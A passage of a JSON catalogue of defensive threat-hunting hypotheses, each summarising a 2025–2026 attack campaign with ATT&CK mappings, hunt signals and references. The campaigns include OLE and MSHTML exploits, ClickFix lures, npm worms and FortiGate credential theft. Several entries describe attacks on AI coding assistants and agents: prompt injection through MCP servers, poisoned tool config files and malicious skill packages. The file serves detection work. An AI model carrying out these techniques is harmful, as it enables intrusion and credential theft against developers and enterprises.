      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- UNC6201 created Ghost NICs on ESXi hosts to bridge isolated network segments — traffic never touches monitored network paths\n- Combined with iptables-based Single Packet Authorization for C2 — connection only activates after a specific knock packet, invisible to passive monitoring\n- VMware infrastructure is a crown jewel but vNIC changes often lack audit logging or alerting\n- Huntable via ESXi host logs: unexpected esxcli network vswitch changes, new portgroups, or vNIC additions outside change windows",
    "references": "- [ATT&CK T1021](https://attack.mitre.org/techniques/T1021/)\n- [ATT&CK T1599](https://attack.mitre.org/techniques/T1599/)\n- Google GTIG/Mandiant — UNC6201 (Feb 2026)",
    "file_path": "Flames/H077.md"
  },
  {
    "id": "H078",
    "category": "Flames",
    "title": "An adversary is exploiting Microsoft Office OLE objects to fetch payloads over WebDAV and establish an Outlook VBA backdoor targeting defense and logistics organizations to conduct long-term espionage via cloud-based command and control.",
    "tactic": "Initial Access",
    "notes": "APT28 CVE-2026-21509 zero-click OLE; NotDoor Outlook VBA backdoor; modified Covenant implant; filen.io C2; COM hijacking persistence",
    "tags": [
      "initial_access",
      "execution",
      "persistence",
      "command_and_control",
      "apt28",
      "notdoor",
      "com_hijacking",
      "T1566.001",
      "T1059.005",
      "T1546.015",
      "T1102"
    ],
    "techniques": [
      "T1566.001",
      "T1059.005",
      "T1546.015",
      "T1102"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- APT28 weaponized CVE-2026-21509 within 24h of disclosure — zero-click OLE execution via spearphishing from compromised gov email accounts\n- Outlook VBA backdoor (NotDoor) + modified Covenant implant = post-exploitation lives entirely in-memory with no disk artifacts\n- C2 traffic blends into legitimate cloud storage (filen.io) — most network monitors won't flag it\n- COM hijacking for persistence is rarely baselined — detection gap in most EDR deployments",
    "references": "- [ATT&CK T1566.001](https://attack.mitre.org/techniques/T1566/001/)\n- [ATT&CK T1546.015](https://attack.mitre.org/techniques/T1546/015/)\n- [ATT&CK T1102](https://attack.mitre.org/techniques/T1102/)\n- Trellix — APT28 CVE-2026-21509 campaign (Feb 2026)",
    "file_path": "Flames/H078.md"
  },
  {
    "id": "H079",
    "category": "Flames",
    "title": "An adversary is abusing Group Policy Objects for lateral deployment and using bring-your-own-vulnerable-driver techniques to terminate security tools targeting enterprise Active Directory environments to disable defenses before executing ransomware with hybrid encryption.",
    "tactic": "Lateral Movement",
    "notes": "CrazyHunter ransomware; GPO abuse looks like legit admin activity; BYOVD to kill EDR; weak AD creds as entry",
    "tags": [
      "lateral_movement",
      "defense_evasion",
      "byovd",
      "gpo",
      "ransomware",
      "crazyhunter",
      "T1484.001",
      "T1562.001",
      "T1106"
    ],
    "techniques": [
      "T1484.001",
      "T1562.001",
      "T1106"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- BYOVD is increasingly common but many orgs lack vulnerable driver blocklists or kernel-level monitoring\n- GPO abuse for ransomware distribution bypasses endpoint-focused detections — it looks like legitimate admin activity\n- Multi-stage execution (disable defenses → in-memory payload) leaves minimal disk artifacts\n- Weak AD credentials as initial access vector — huntable via authentication log baselines",
    "references": "- [ATT&CK T1484.001](https://attack.mitre.org/techniques/T1484/001/)\n- [ATT&CK T1562.001](https://attack.mitre.org/techniques/T1562/001/)\n- Trellix — CrazyHunter ransomware (Feb 2026)",
    "file_path": "Flames/H079.md"
  },
  {
    "id": "H080",
    "category": "Flames",
    "title": "An adversary is using fake human-verification prompts to trick users into executing clipboard-injected commands targeting hospitality sector organizations to deploy remote access trojans for credential theft and data exfiltration.",
    "tactic": "Initial Access",
    "notes": "ClickFix technique; fake CAPTCHA prompts; clipboard command injection; bypasses email security; user-initiated execution",
    "tags": [
      "initial_access",
      "execution",
      "command_and_control",
      "clickfix",
      "social_engineering",
      "rat",
      "T1566.002",
      "T1204.002",
      "T1219"
    ],
    "techniques": [
      "T1566.002",
      "T1204.002",
      "T1219"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- ClickFix is evolving rapidly — sector-specific lures increase success rates beyond generic phishing\n- The \"run this command to verify\" pattern bypasses email security entirely since the user initiates execution\n- Clipboard-based command injection is hard to detect without endpoint telemetry on clipboard + shell activity\n- Hospitality sector often has weaker security maturity — could expand to other verticals",
    "references": "- [ATT&CK T1566.002](https://attack.mitre.org/techniques/T1566/002/)\n- [ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)\n- SecurityWeek — ClickFix hospitality campaign (Feb 2026)",
    "file_path": "Flames/H080.md"
  },
  {
    "id": "H081",
    "category": "Flames",
    "title": "An adversary is publishing typosquatted npm packages with MCP server injection targeting developer environments using AI coding assistants to harvest SSH keys, cloud credentials, and LLM API keys via prompt injection.",
    "tactic": "Initial Access",
    "notes": "SANDWORM_MODE campaign; typosquatted npm packages; MCP server injection; worm propagates via stolen npm/GitHub tokens; 48h delayed second stage",
    "tags": [
      "initial_access",
      "credential_access",
      "collection",
      "npm",
      "supply_chain",
      "mcp",
      "ai_coding_assistant",
      "T1195.002",
      "T1555",
      "T1119"
    ],
    "techniques": [
      "T1195.002",
      "T1555",
      "T1119"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- MCP server injection is a novel attack vector — most security teams have zero visibility into AI tool configurations\n- Worm propagates using stolen npm/GitHub tokens, meaning one compromised dev can seed packages across an org\n- 48-hour delayed second stage with per-machine jitter evades sandbox analysis and incident response timelines\n- Targets 9 LLM provider API keys — compromised keys enable downstream abuse at scale",
    "references": "- [ATT&CK T1195.002](https://attack.mitre.org/techniques/T1195/002/)\n- [ATT&CK T1555](https://attack.mitre.org/techniques/T1555/)\n- Socket — SANDWORM_MODE campaign (Feb 2026)",
    "file_path": "Flames/H081.md"
  },
  {
    "id": "H082",
    "category": "Flames",
    "title": "An adversary is poisoning AI coding tool project configurations such as hooks, MCP servers, and environment variables in shared repositories targeting developer workstations to achieve remote code execution and API credential theft.",
    "tactic": "Initial Access",
    "notes": "CVE-2025-59536 / CVE-2026-21852; malicious .claude/settings.json and .mcp.json execute shell on clone; AI dev tools poorly monitored",
    "tags": [
      "initial_access",
      "execution",
      "supply_chain",
      "mcp",
      "ai_coding_tools",
      "claude_code",
      "T1195.001",
      "T1059.004"
    ],
    "techniques": [
      "T1195.001",
      "T1059.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Check Point disclosed CVE-2025-59536 / CVE-2026-21852 — malicious `.claude/settings.json` and `.mcp.json` files execute shell commands on clone with minimal user warning\n- AI coding tools are rapidly adopted in enterprise dev workflows — growing, poorly-monitored attack surface\n- Traditional EDR focuses on binary execution, not config-triggered shell commands from trusted dev tools\n- Data sources: Git clone/pull logs, process creation from AI tool parent processes, `.claude/` and `.mcp.json` file creation events",
    "references": "- [ATT&CK T1195.001](https://attack.mitre.org/techniques/T1195/001/)\n- [ATT&CK T1059.004](https://attack.mitre.org/techniques/T1059/004/)\n- Check Point Research — CVE-2025-59536 / CVE-2026-21852 (Feb 2026)",
    "file_path": "Flames/H082.md"
  },
  {
    "id": "H083",
    "category": "Flames",
    "title": "An adversary is exploiting MSHTML framework flaws in crafted Windows Shortcut files with embedded HTML to bypass Mark-of-the-Web and browser security boundaries targeting Windows enterprise endpoints to achieve arbitrary code execution outside the browser sandbox.",
    "tactic": "Initial Access",
    "notes": "APT28 zero-day CVE-2026-21513; LNK with embedded HTML; bypasses MotW and IE Enhanced Security; ieframe.dll code path exploitable beyond LNK",
    "tags": [
      "initial_access",
      "defense_evasion",
      "mshtml",
      "motw_bypass",
      "lnk",
      "apt28",
      "T1566.001",
      "T1553.005"
    ],
    "techniques": [
      "T1566.001",
      "T1553.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- CVE-2026-21513 was exploited as a zero-day by APT28 before the Feb 2026 patch — orgs slow to patch are exposed now\n- The technique bypasses MotW and IE Enhanced Security Configuration, defeating a core Windows trust boundary that many detection stacks rely on\n- The vulnerable code path in ieframe.dll can be triggered by ANY component embedding MSHTML, not just LNK files — delivery vectors beyond phishing should be expected\n- Observable artifacts: LNK files with abnormally large payloads, nested iframe DOM manipulation, ShellExecuteExW calls from MSHTML contexts",
    "references": "- [ATT&CK T1566.001](https://attack.mitre.org/techniques/T1566/001/)\n- [ATT&CK T1553.005](https://attack.mitre.org/techniques/T1553/005/)\n- Akamai — CVE-2026-21513 MSHTML exploit analysis (Feb 2026)",
    "file_path": "Flames/H083.md"
  },
  {
    "id": "H084",
    "category": "Flames",
    "title": "An adversary is deploying a malicious Ruby interpreter disguised as a legitimate USB utility on removable media targeting air-gapped networks in critical infrastructure and research sectors to establish a bidirectional covert C2 relay that bridges isolated network segments for data exfiltration and command delivery.",
    "tactic": "Initial Access",
    "notes": "APT37 RubyJumper; Ruby 3.3.0 disguised as usbspeed.exe; RubyGems operating_system.rb hijack; THUMBSBD hidden dirs on USB; FOOTWINE full surveillance suite",
    "tags": [
      "initial_access",
      "command_and_control",
      "defense_evasion",
      "usb",
      "air_gap",
      "apt37",
      "rubyjumper",
      "T1091",
      "T1092",
      "T1036.005"
    ],
    "techniques": [
      "T1091",
      "T1092",
      "T1036.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Air-gapped networks are high-value targets and defenders often assume physical isolation equals safety — this toolkit shatters that assumption\n- The attack chain disguises the Ruby 3.3.0 runtime as usbspeed.exe and hijacks RubyGems operating_system.rb auto-load mechanism — a novel persistence trick unlikely to be in current detection rules\n- THUMBSBD creates hidden directories on USB drives and turns them into bidirectional C2 relays — look for hidden dirs, scheduled tasks named rubyupdatecheck, and unexpected Ruby interpreters on endpoints\n- Includes FOOTWINE spyware with keylogging, screen/audio/video capture, and remote shell — full surveillance suite once inside the gap",
    "references": "- [ATT&CK T1091](https://attack.mitre.org/techniques/T1091/)\n- [ATT&CK T1092](https://attack.mitre.org/techniques/T1092/)\n- [ATT&CK T1036.005](https://attack.mitre.org/techniques/T1036/005/)\n- Zscaler ThreatLabz — APT37 RubyJumper (Mar 2026)",
    "file_path": "Flames/H084.md"
  },
  {
    "id": "H085",
    "category": "Flames",
    "title": "An adversary is using Google Drive API calls as command-and-control communication targeting government and critical sector organizations to exfiltrate data and maintain persistent remote access while evading network-based detection.",
    "tactic": "Command and Control",
    "notes": "Silver Dragon/APT41 GearDoor backdoor; Google Drive API for C2; file-based tasking via extensions; blends with legitimate Workspace traffic",
    "tags": [
      "command_and_control",
      "google_drive",
      "cloud_c2",
      "apt41",
      "silver_dragon",
      "T1102.002"
    ],
    "techniques": [
      "T1102.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Silver Dragon (APT41 umbrella) actively uses a custom backdoor (GearDoor) that authenticates to attacker-controlled Google Drive accounts, uploads heartbeat files, and receives tasking via file extensions — all over legitimate Google APIs\n- Google Drive traffic blends with normal business activity, making it nearly invisible to traditional network monitoring and domain-based blocklists\n- The C2 protocol is fully file-based — commands arrive as uploaded files, results return as .db/.bak files — meaning no anomalous HTTP patterns to trigger IDS signatures\n- Organizations with Google Workspace have high volumes of legitimate Drive API traffic, creating perfect cover for this technique",
    "references": "- [ATT&CK T1102.002](https://attack.mitre.org/techniques/T1102/002/)\n- Check Point Research — Silver Dragon / APT41 (Mar 2026)",
    "file_path": "Flames/H085.md"
  },
  {
    "id": "H086",
    "category": "Flames",
    "title": "An adversary is compromising software update infrastructure to deliver malicious DLLs sideloaded by legitimate signed executables targeting organizations in government finance and IT sectors to establish persistent backdoor access.",
    "tactic": "Defense Evasion",
    "notes": "Notepad++ supply chain Jun-Dec 2025; three infection chains; Chrysalis backdoor masquerades as DeepSeek API; DLL sideloading via signed ProShow/GameHook/BluetoothService",
    "tags": [
      "defense_evasion",
      "initial_access",
      "dll_sideloading",
      "supply_chain",
      "notepadpp",
      "chrysalis",
      "T1574.002",
      "T1195.002"
    ],
    "techniques": [
      "T1574.002",
      "T1195.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- The Notepad++ supply chain compromise (Jun-Dec 2025) used three distinct infection chains all culminating in DLL sideloading — legitimate executables loading malicious DLLs that decrypt and inject Cobalt Strike or the Chrysalis backdoor\n- Chrysalis masquerades its C2 traffic as DeepSeek API calls — hunting for unusual API-path patterns from non-browser processes is a detection gap most SOCs have not closed\n- Sideloading abuses trust in signed binaries — the malicious DLL runs under the context of a legitimate signed process, bypassing application whitelisting and EDR behavioral rules\n- Three sectors confirmed targeted (government, finance, IT) across four countries — ran undetected for approximately 6 months",
    "references": "- [ATT&CK T1574.002](https://attack.mitre.org/techniques/T1574/002/)\n- [ATT&CK T1195.002](https://attack.mitre.org/techniques/T1195/002/)\n- Picus Security — Notepad++ Supply Chain Attack and Chrysalis Backdoor (2026)",
    "file_path": "Flames/H086.md"
  },
  {
    "id": "H087",
    "category": "Flames",
    "title": "An adversary is injecting malicious preinstall scripts into npm packages using stolen developer tokens targeting software development organizations to harvest credentials across cloud platforms and propagate through the software supply chain.",
    "tactic": "Initial Access",
    "notes": "Shai-Hulud v2 worm; steals npm tokens and republishes poisoned packages; harvests GitHub/AWS/GCP/Azure creds; Trufflehog against home dirs; dead man switch for destruction",
    "tags": [
      "initial_access",
      "credential_access",
      "npm",
      "supply_chain",
      "worm",
      "shai_hulud",
      "T1195.001",
      "T1552.001"
    ],
    "techniques": [
      "T1195.001",
      "T1552.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Shai-Hulud v2 is an active worm — once it compromises a developer it steals npm tokens, downloads all their packages, injects a malicious preinstall hook, bumps the version, and republishes automatically creating exponential spread\n- The malware harvests GitHub tokens, AWS/GCP/Azure creds, and runs Trufflehog against the developer home directory — a single infected install can compromise an entire organization cloud infrastructure\n- Exfiltrated credentials are stored in public GitHub repos making takedown difficult while compromised systems share tokens in a botnet-like mesh\n- Contains a destructive dead man switch — if C2 channels are severed it triggers data destruction raising the stakes for incident response",
    "references": "- [ATT&CK T1195.001](https://attack.mitre.org/techniques/T1195/001/)\n- [ATT&CK T1552.001](https://attack.mitre.org/techniques/T1552/001/)\n- GitLab Vulnerability Research — Shai-Hulud npm supply chain attack (2026)",
    "file_path": "Flames/H087.md"
  },
  {
    "id": "H088",
    "category": "Flames",
    "title": "An adversary is using ClickFix social engineering via the Windows Terminal application targeting enterprise endpoints to deploy commodity loaders and backdoors for ransomware pre-positioning.",
    "tactic": "Initial Access",
    "notes": "Velvet Tempest/DEV-0504 ransomware affiliate; shift from Run dialog to Windows Terminal; finger.exe for payload retrieval; csc.exe runtime .NET compilation; Python persistence in ProgramData",
    "tags": [
      "initial_access",
      "execution",
      "defense_evasion",
      "clickfix",
      "windows_terminal",
      "ransomware",
      "velvet_tempest",
      "T1204.002",
      "T1059.001",
      "T1027.004"
    ],
    "techniques": [
      "T1204.002",
      "T1059.001",
      "T1027.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Velvet Tempest (DEV-0504) — a prolific ransomware affiliate tied to Ryuk, Conti, BlackCat, LockBit — is actively using this chain as of Feb 2026\n- The shift from Windows Run dialog to Windows Terminal bypasses traditional ClickFix detections that monitor cmd.exe spawned from explorer.exe via Run\n- The attack chain uses finger.exe for payload retrieval and csc.exe for runtime .NET compilation in temp directories — both are LOLBins with low baseline noise\n- Python-based persistence components in C:\\ProgramData provide a secondary detection surface most EDR alert logic does not cover",
    "references": "- [ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)\n- [ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n- [ATT&CK T1027.004](https://attack.mitre.org/techniques/T1027/004/)\n- BleepingComputer — Velvet Tempest ClickFix campaign (Mar 2026)",
    "file_path": "Flames/H088.md"
  },
  {
    "id": "H089",
    "category": "Flames",
    "title": "An adversary is using social engineering to trick users into executing hex-encoded commands in Windows Terminal to deploy information-stealing malware targeting enterprise users to harvest credentials and session tokens.",
    "tactic": "Execution",
    "notes": "ClickFix shift from Run dialog to Windows Terminal; hex-encoded command execution in wt.exe; Lumma Stealer targets 100+ browsers and apps; strong anomaly signal from wt.exe parent-child process chains",
    "tags": [
      "execution",
      "credential_access",
      "clickfix",
      "windows_terminal",
      "lumma_stealer",
      "infostealer",
      "T1204.002",
      "T1059.001",
      "T1555"
    ],
    "techniques": [
      "T1204.002",
      "T1059.001",
      "T1555"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- This campaign deliberately shifts execution from the Windows Run dialog to Windows Terminal — existing detections that monitor cmd.exe spawned from explorer.exe via Run will miss it entirely\n- Hex-encoded command execution in wt.exe is a strong anomaly — baseline your environment and hunt for unusual parent-child process relationships involving wt.exe\n- Lumma Stealer targets 100+ browsers and applications — post-compromise credential harvesting creates immediate downstream risk for SSO, cloud apps, and VPN access\n- ClickFix campaigns have evolved rapidly through 2025-2026, each iteration bypassing the previous round of detections — this is the latest evasion pivot",
    "references": "- [ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)\n- [ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n- [ATT&CK T1555](https://attack.mitre.org/techniques/T1555/)\n- Microsoft Threat Intelligence — ClickFix via Windows Terminal (Mar 2026)",
    "file_path": "Flames/H089.md"
  },
  {
    "id": "H090",
    "category": "Flames",
    "title": "An adversary is using ClickFix social engineering to trick users into executing obfuscated commands that leverage finger.exe as a LOLBin to fetch malware payloads targeting enterprise endpoints to deploy ransomware precursor tooling.",
    "tactic": "Initial Access",
    "notes": "Velvet Tempest/DEV-0504; finger.exe rarely used — any execution is anomalous; user pastes command bypassing email gateways; Chrome cred harvesting via PowerShell; csc.exe compilation in temp dirs",
    "tags": [
      "initial_access",
      "defense_evasion",
      "clickfix",
      "lolbin",
      "finger_exe",
      "ransomware",
      "velvet_tempest",
      "T1204.002",
      "T1218"
    ],
    "techniques": [
      "T1204.002",
      "T1218"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Velvet Tempest (DEV-0504) — a prolific ransomware affiliate behind Ryuk, Conti, BlackCat, LockBit — is actively using this chain as of Feb 2026\n- finger.exe is a rarely-used Windows utility that most orgs never touch — any execution is anomalous and easy to baseline\n- The ClickFix technique bypasses email gateway controls because the user manually pastes the command — no malicious attachment to scan\n- Post-access activity includes Chrome credential harvesting via PowerShell and csc.exe compilation in temp directories — multiple detection surfaces",
    "references": "- [ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)\n- [ATT&CK T1218](https://attack.mitre.org/techniques/T1218/)\n- BleepingComputer — Velvet Tempest/Termite ransomware via ClickFix (Mar 2026)",
    "file_path": "Flames/H090.md"
  },
  {
    "id": "H091",
    "category": "Flames",
    "title": "An adversary is abusing VS Code extension dependency mechanisms to turn initially benign marketplace extensions into transitive delivery vehicles for credential theft and cryptomining malware targeting software developers.",
    "tactic": "Initial Access",
    "notes": "GlassWorm campaign; 72+ malicious Open VSX extensions since Jan 2026; extensionPack/extensionDependencies abuse; trust-then-pivot pattern; concurrent Unicode injection in 151+ GitHub repos",
    "tags": [
      "initial_access",
      "persistence",
      "credential_access",
      "vscode",
      "supply_chain",
      "glassworm",
      "developer_tooling",
      "T1195.001",
      "T1554",
      "T1555"
    ],
    "techniques": [
      "T1195.001",
      "T1554",
      "T1555"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Socket identified 72+ new malicious Open VSX extensions since Jan 31 2026 — a significant escalation of the ongoing GlassWorm campaign\n- The new tactic publishes clean extensions first to pass review then updates them to list GlassWorm-linked packages as dependencies — the trust-then-pivot pattern makes initial detection very difficult\n- Concurrent campaign injecting 151+ GitHub repos with invisible Unicode characters encoding malicious payloads — multiple attack surfaces converging on developer tooling\n- Data sources: VS Code extension install logs, extension manifest changes (package.json extensionPack/extensionDependencies fields), network connections from VS Code extension host processes",
    "references": "- [ATT&CK T1195.001](https://attack.mitre.org/techniques/T1195/001/)\n- [ATT&CK T1554](https://attack.mitre.org/techniques/T1554/)\n- [ATT&CK T1555](https://attack.mitre.org/techniques/T1555/)\n- Socket / Aikido — GlassWorm VS Code supply chain campaign (Mar 2026)",
    "file_path": "Flames/H091.md"
  },
  {
    "id": "H092",
    "category": "Flames",
    "title": "An adversary is performing automated scanning for unauthenticated AI agent API export endpoints (CVE-2026-25253 pattern), targeting cloud-hosted AI agent deployments, to harvest stored LLM service credentials for downstream API abuse.",
    "tactic": "Credential Access (T1552)",
    "notes": "CVE-2026-25253 (Hunt.io research, Mar 2026): unauthenticated `/api/export-auth` endpoint in OpenClaw, Clawdbot, and Moltbot exposes AI service credentials (Claude, OpenAI, Google AI). 17,500+ internet-exposed instances identified; 68.9% Clawdbot, 22.3% Moltbot, 8.8% OpenClaw. 98.6% on cloud infrastructure across 52 countries.",
    "tags": [
      "credential_access",
      "cve_2026_25253",
      "ai_agent_security",
      "api_key_exfil",
      "openclaw",
      "clawdbot",
      "T1552"
    ],
    "techniques": [
      "T1552"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- 17,500+ confirmed internet-exposed AI agent instances make this an extremely high-value mass-exploitation target\n- Stolen LLM API keys enable adversaries to conduct further AI-assisted attacks or sell access — substantial financial and operational risk\n- Unauthenticated endpoints are trivially exploitable with a single HTTP GET — no authentication bypass required\n- Web/API gateway logs may show burst GET requests to `/api/export-auth` from scanning infrastructure, but many orgs lack visibility into AI agent HTTP logs\n- Data sources: web application firewall logs, HTTP access logs for AI agent services, network flow data (scanning patterns), threat intel feeds for CVE exploitation in the wild",
    "references": "- https://attack.mitre.org/techniques/T1552/\n- https://hunt.io/blog/cve-2026-25253-openclaw-ai-agent-exposure",
    "file_path": "Flames/H092.md"
  },
  {
    "id": "H093",
    "category": "Flames",
    "title": "An adversary is deploying AI-vibe-coded malware compiled in obscure languages (Nim, Zig, Crystal) to evade signature-based antivirus detection, targeting Windows endpoints in government and defense sectors, to achieve persistent execution while bypassing conventional security tooling.",
    "tactic": "Defense Evasion (T1027)",
    "notes": "APT36/Transparent Tribe campaign (Mar 2026, Bitdefender): Pakistan-aligned APT uses AI code generation (\"vibe-coding\") to mass-produce unique Nim, Zig, and Crystal malware samples; volume combined with obscure language compilation produces AV-unknown binaries at scale; paired with C2 over Slack/Discord/Google Sheets (see H091).",
    "tags": [
      "defense_evasion",
      "nim",
      "zig",
      "crystal",
      "obscure_language_malware",
      "apt36",
      "ai_generated_malware",
      "T1027"
    ],
    "techniques": [
      "T1027"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Major AV engines have minimal signatures for Nim/Zig/Crystal binaries — APT36 is exploiting this gap at scale using AI-assisted mass production of unique variants\n- AI vibe-coding enables rapid generation of functionally unique samples, defeating hash-based detection and exhausting analyst triage capacity\n- Behavioral detection (process injection, suspicious parent-child chains, network callbacks) is more reliable than signature matching for these payloads\n- Hunt for unusual PE characteristics: Nim runtime strings (`NimMain`, `nimGC`), Zig stdlib artifacts, Crystal runtime patterns; EDR process tree anomalies are the primary signal\n- Data sources: EDR telemetry (process creation, file writes), PE metadata analysis, AV scan logs showing low/zero detection rates on new binaries",
    "references": "- https://attack.mitre.org/techniques/T1027/\n- https://businessinsights.bitdefender.com/apt36-nightmare-vibeware",
    "file_path": "Flames/H093.md"
  },
  {
    "id": "H094",
    "category": "Flames",
    "title": "An adversary is distributing malicious AI agent skill packages targeting macOS endpoints running OpenClaw or similar agentic platforms to achieve credential theft, keychain access, and browser data exfiltration.",
    "tactic": "Initial Access (T1195.001)",
    "notes": "Hundreds of malicious skills distributed via ClawHub/SkillsMP deliver AMOS (Atomic macOS Stealer) via a trusted install chain: SKILL.md installs a prerequisite that downloads an unsigned Mach-O binary which immediately begins exfiltration. Same technique family as Vidar/Lumma on Windows — supply chain abuse via trusted package registries. Developer team ID `GNJLS3UYZ4` observed for related MacSync variant. (VLM-2026-03-12-001, radar.offseq.com, Mar 2026)",
    "tags": [
      "initial_access",
      "supply_chain",
      "macos",
      "infostealer",
      "amos",
      "agentic_ai",
      "openclaw",
      "T1195.001"
    ],
    "techniques": [
      "T1195.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- AI agent skill marketplaces (ClawHub, SkillsMP) have no code signing or runtime execution controls — a malicious `SKILL.md` is functionally a weaponized install script with full user-level access\n- The install chain is trusted by design: users explicitly approve skill installs, making this invisible to traditional \"user was tricked\" detection models\n- AMOS targets macOS keychains, browser cookies/passwords, crypto wallets, and 2FA seeds in a single execution — high-value credential sweep with minimal dwell time\n- Most macOS endpoint telemetry doesn't capture SKILL.md-triggered process chains; defenders are blind to this vector without agent-aware process lineage\n- Broadly applicable: any org deploying OpenClaw, Claude Desktop, Cursor, or similar agentic AI tools on macOS is in scope",
    "references": "- https://attack.mitre.org/techniques/T1195/001/\n- https://attack.mitre.org/techniques/T1059/004/\n- https://attack.mitre.org/techniques/T1555/\n- https://radar.offseq.com (VLM-2026-03-12-001, Mar 12 2026)",
    "file_path": "Flames/H094.md"
  },
  {
    "id": "H095",
    "category": "Flames",
    "title": "An adversary is exploiting n8n workflow automation servers via expression injection (CVE-2025-68613) to execute arbitrary commands and use the platform's internal trust and integrations for lateral movement and credential access.",
    "tactic": "Execution (T1059)",
    "notes": "CVE-2025-68613: Improper Control of Dynamically-Managed Code Resources (CVSS 9.9) in n8n expression evaluation. Added to CISA KEV 2026-03-11, due date 2026-03-25. 24,700 instances remain internet-exposed per The Hacker News at time of KEV addition. n8n instances typically hold API keys, OAuth tokens, and database credentials in workflow configs — a compromised node is a credential treasure chest and a trusted pivot point into internal APIs. (VLM-2026-03-12-002/013, CISA KEV)",
    "tags": [
      "execution",
      "rce",
      "n8n",
      "cisa_kev",
      "cve_2025_68613",
      "workflow_automation",
      "lateral_movement",
      "credential_access",
      "T1059"
    ],
    "techniques": [
      "T1059"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- n8n runs with broad access by design: it holds credentials for dozens of downstream integrations (SaaS, databases, internal APIs) — post-exploitation value is extremely high\n- Workflow automation platforms are rarely monitored for anomalous process execution; defenders treat them as trusted internal tooling\n- CVSS 9.9 + CISA KEV = actively exploited in the wild; the 2026-03-25 remediation deadline means many orgs are still patching during active exploitation\n- Shell commands spawned from an n8n service process are abnormal by definition — process lineage is a reliable, low-false-positive detection anchor\n- Broadly applicable: n8n is widely deployed in SMBs, startups, and enterprise automation teams; 24,700 exposed instances confirm the attack surface is large",
    "references": "- https://attack.mitre.org/techniques/T1059/\n- https://attack.mitre.org/techniques/T1046/\n- https://attack.mitre.org/techniques/T1078/\n- https://www.cisa.gov/known-exploited-vulnerabilities-catalog\n- https://thehackernews.com (CVE-2025-68613 detail, Mar 12 2026)",
    "file_path": "Flames/H095.md"
  },
  {
    "id": "H096",
    "category": "Flames",
    "title": "An adversary is exploiting FortiGate NGFW vulnerabilities to exfiltrate device configuration files containing plaintext Active Directory and LDAP service account credentials for subsequent lateral movement and privileged access.",
    "tactic": "Credential Access (T1552.001)",
    "notes": "Active campaign abusing CVE-2024-47575 and CVE-2024-55591 (FortiGate auth bypass / command injection) to extract config files containing plaintext AD/LDAP service account credentials. Targets observed: healthcare, government, MSPs — sectors with high-value AD environments. Credentials extracted from FortiGate configs are often service accounts with broad internal access, enabling fast lateral movement post-extraction. (VLM-2026-03-12-004, SentinelOne / kensai.app, Mar 12 2026)",
    "tags": [
      "credential_access",
      "fortinet",
      "fortigate",
      "active_directory",
      "ldap",
      "lateral_movement",
      "healthcare",
      "government",
      "cve_2024_47575",
      "cve_2024_55591",
      "T1552.001"
    ],
    "techniques": [
      "T1552.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- FortiGate config files frequently contain LDAP bind credentials in plaintext — a known but widely unmitigated exposure in enterprise deployments\n- Service accounts stored in firewall configs often have broad AD permissions (domain read, sometimes admin-level) because they were provisioned for VPN authentication or identity lookups\n- Exploitation of the initial CVEs may leave no obvious alert; the credential exfil and subsequent AD abuse are the detectable downstream behaviors\n- Auth events from service accounts suddenly authenticating from unexpected workstations or using anomalous LDAP queries are reliably detectable with existing SIEM/AD telemetry\n- Sectors targeted (healthcare, government, MSPs) manage large AD environments where a single compromised service account can cascade across tenants or patient-care systems",
